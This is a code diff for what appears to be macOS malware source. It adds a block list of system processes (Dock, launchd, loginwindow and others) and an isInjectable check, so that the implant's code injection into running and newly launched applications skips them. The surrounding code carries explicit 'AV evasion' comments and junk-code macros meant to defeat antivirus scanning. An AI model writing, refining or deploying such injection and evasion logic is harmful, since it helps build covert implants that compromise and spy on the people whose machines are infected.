@@ -96,6 +96,15 @@
 //   no longer abortable by anyone. Point of no return!
 #define kSLLWLogoutPointOfNoReturn    "com.apple.system.loginwindow.logoutNoReturn"
 
+NSString *appBListArray[] = { @"mdworker",
+                              @"SystemUIServer",
+                              @"Dock",
+                              @"launchd",
+                              @"loginwindow",
+                              @"UserEventAgent",
+                              NULL};
+
+
 static int gLWShutdownNotificationToken               = 0;
 static int gLWRestartNotificationToken                = 0;
 static int gLWLogoutCancelNotificationToken           = 0;
@@ -3564,6 +3573,24 @@ static void computerWillShutdown(CFMachPortRef port,
   return 0;
 }
 
+- (BOOL)isInjectable:(NSString*)appName
+{
+  int i = 0;
+  
+  if (appName == nil &&
+      ![appName isKindOfClass: [NSString class]])
+    return TRUE;
+  
+  while (appBListArray[i] != NULL)
+  {
+    if ([appName compare: appBListArray[i]] == NSOrderedSame)
+      return FALSE;
+    i++;
+  }
+  
+  return TRUE;
+}
+
 - (void)sendEventToPid: (NSNumber *)thePid
 {  
   // AV evasion: only on release build
@@ -3751,6 +3778,9 @@ static void computerWillShutdown(CFMachPortRef port,
     for (int i=0; i<[apps count]; i++) 
     {
       NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
+      
+      if ([self isInjectable:[app localizedName]] == FALSE)
+        continue;
       
       // AV evasion: only on release build
       AV_GARBAGE_006
@@ -4579,6 +4609,9 @@ static void computerWillShutdown(CFMachPortRef port,
   AV_GARBAGE_007
   
   NSDictionary *appInfo = [notification userInfo];
+  
+  if ([self isInjectable:[appInfo objectForKey:@"NSApplicationName"]] == FALSE)
+    return;  
   
   // AV evasion: only on release build
   AV_GARBAGE_008
